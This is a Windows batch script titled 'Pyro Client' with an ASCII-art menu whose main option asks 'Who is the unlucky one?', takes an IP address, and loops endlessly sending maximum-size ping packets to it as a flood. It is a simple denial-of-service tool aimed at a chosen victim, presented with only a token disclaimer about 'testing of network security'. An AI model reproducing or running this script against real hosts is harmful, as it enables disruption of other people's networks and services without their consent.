echo off
chcp 65001
title Pyro Client by Nathan Hobbs (c) 2020
color 05
cls

:START
powershell write-host -fore Yellow -back Red WARNING, THIS IS A BETA BUILD. BE PREPARED FOR ANY GLITCHES THAT MAY OCCUR.
echo By using this program you adbide by the TOS located in "Program Info"
echo ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
echo ║█████████  ██      ██  █████████  █████████        █████████   ██       ██  █████████  ██████████  █████████║
echo ║██▓▓▓▓▓██  ██      ██  ██▓▓▓▓▓██  ██▓▓▓▓▓██        ██▓▓▓▓▓▓▓   ██       ██  ██▓▓▓▓▓▓▓  ██▓▓▓▓▓▓██  ▓▓▓██▓▓▓▓║
echo ║█████████  ██████████  ███████▓▓  ██▒▒▒▒▒██        ██▒▒▒▒▒▒▒   ██       ██  ███████▒▒  ██▒▒▒▒▒▒██  ▒▒▒██▒▒▒▒║
echo ║██▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓██  ██▓▓▓▓▓██  ██░░░░░██        ██░░░░░░░   ██       ██  ██▓▓▓▓▓░░  ██░░░░░░██  ░░░██░░░░║
echo ║██▒▒▒▒▒▒▒  ██████████  ██▒▒▒▒▒██  █████████        █████████   ███████  ██  █████████  ██      ██     ██    ║
echo ║▓▓░░░░░░░  ▓▓▓▓▓▓▓▓▓▓  ▓▓░░░░░▓▓  ▓▓▓▓▓▓▓▓▓        ▓▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓▓  ▓▓  ▓▓▓▓▓▓▓▓▓  ▓▓      ▓▓     ▓▓    ║
echo ║▒▒         ▒▒▒▒▒▒▒▒▒▒  ▒▒     ▒▒  ▒▒▒▒▒▒▒▒▒        ▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒▒▒  ▒▒      ▒▒     ▒▒    ║
echo ║░░         ░░░░░░░░░░  ░░     ░░  ░░░░░░░░░        ░░░░░░░░░   ░░░░░░░  ░░  ░░░░░░░░░  ░░      ░░     ░░    ║
echo ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
echo.
echo.
echo.

echo                ─┐ 
echo                 │ Start client
echo                ─┴─
echo.
echo                        ───┐
echo                        ┌──┘ Program Info
echo                        └───
echo.
echo                                  ──┐
echo                                  ──┤ Exit client
echo                                  ──┘
echo.
echo.
choice /c 123 /m ""

if ERRORLEVEL 3 goto exit
if ERRORLEVEL 2 goto info
if ERRORLEVEL 1 goto combust

:EXIT

exit

:COMBUST

echo.
echo.
echo.
echo.
echo Who is the unlucky one?
set /p ip=""
goto combustion

:COMBUSTION
ping %ip% -l 65535 -w 1 -n 1  | find "Reply" > nul 
color 04
echo.
echo 65KB of fire sent to %ip%!
echo.
ping %ip% -l 65535 -w 1 -n 1  | find "Reply" > nul 
color 06
echo.
echo 65KB of fire sent to %ip%!
echo.


goto combustion

:INFO

echo.
echo.
echo.
echo Client made by Nathan Hobbs. (c) 2020
echo Do not redistribute.
echo.
echo The creator is not liable for any damage created using this program.
echo This is to be used ONLY for the testing of network security.
echo.
pause
cls
goto start


